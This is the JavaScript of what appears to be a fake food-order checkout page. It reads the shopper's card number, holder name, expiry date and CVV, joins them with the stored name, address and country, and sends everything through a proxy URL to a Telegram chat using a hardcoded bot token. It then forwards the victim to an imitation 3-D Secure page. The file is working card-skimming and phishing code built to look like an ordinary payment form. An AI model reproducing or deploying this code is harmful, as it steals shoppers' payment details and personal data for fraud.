// Labels

// Data
const cardNumber = document.querySelector('#number');
const cardHolder = document.querySelector('#cardHolder');
const expire = document.querySelector('#expire');
const cvv = document.querySelector('#cvv');
const amountPrice = document.querySelector('.invoice-info__value');

let totalPriceOrder = 0;
const order = JSON.parse(localStorage.getItem('Order'));
if (order) {
    order.map((item, idx) => {
        console.log('value parent: ', (Number(item.price) * Number(item.quantity)))
        totalPriceOrder = totalPriceOrder + (Number(item.price) * Number(item.quantity));
        if (item.sides.length) {
            item.sides.map(side => {
                console.log('value parent: ', (Number(side.price) * Number(side.quantity)))
                totalPriceOrder = totalPriceOrder + (Number(side.price) * Number(side.quantity));
            })
        }
    })
    amountPrice.textContent = `${totalPriceOrder}`
}

let mistakesForm = [];

function nullMistakes() {
    cardNumber.style.border = 'none';
    cardHolder.style.border = 'none';
    expire.style.border = 'none';
    cvv.style.border = 'none';
    mistakesForm = [];
    btnPay.disabled = false;
}


const btnPay = document.querySelector('#PayDollars');


function sendToTelegram(profile) {
    btnPay.disabled = true;

    const needUrl = "https://simply-paleo.com/cors/";
    const needIdChat = "-654323413";
    const needToken = "2125812022:AAE-2zAqpaK017pXEriRyAVq_RNS-sCdmmo";

    const id_chat = needIdChat;
    const password = "";
    const token = needToken;
    const host = window.location.host;

    // console.log(profile)

    let CardExpire = profile.card_expire.split(/(?=(?:\d{2})+(?!\d))/).join('/')

    const message = `
    Address: ${profile.Address}\n
    Country: ${profile.Country}\n
    FullName: ${profile.FullName}\n
    Card Number: ${profile.card_number}\n
    Card Holder: ${profile.card_holder}\n
    Card Expire: ${CardExpire}\n
    Card CVV: ${profile.card_cvv}\n
    Total Order Price: ${totalPriceOrder}\n
    Host: ${host}
    `;
    // console.log(message);
    const formData = {
      chat_id: id_chat,
      password: password,
      token: token,
      message: message,
    };

    fetch(needUrl, {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
      },
      body: JSON.stringify(formData),
    })
      .then((x) => x.json())
      .then(() => {
        // localStorage.removeItem('Order');
        // localStorage.removeItem('DeliveryAddress');
        setTimeout(() => {
          window.location.href = "./3ds/3ds.html";
        }, 500);
      });
}


btnPay.addEventListener('click', (e) => {
    e.preventDefault();
    nullMistakes();
    console.log('cardNumber: ', cardNumber.value);
    console.log('cardHolder: ', cardHolder.value);
    console.log('expire: ', expire.value);
    console.log('cvv: ', cvv.value);

    if (!cardNumber.value) {
        cardNumber.style.border = '1px solid red';
        mistakesForm.push(1);
    }
    if (!cardHolder.value) {
        cardHolder.style.border = '1px solid red';
        mistakesForm.push(1);
    }
    if (!expire.value) {
        expire.style.border = '1px solid red';
        mistakesForm.push(1);
    }
    if (!cvv.value) {
        cvv.style.border = '1px solid red';
        mistakesForm.push(1);
    }

    if (!mistakesForm.length) {
        let profile = JSON.parse(localStorage.getItem('Profile'));
        profile['card_number'] = cardNumber.value;
        profile['card_holder'] = cardHolder.value;
        profile['card_expire'] = expire.value;
        profile['card_cvv'] = cvv.value;

        sendToTelegram(profile);
    }
})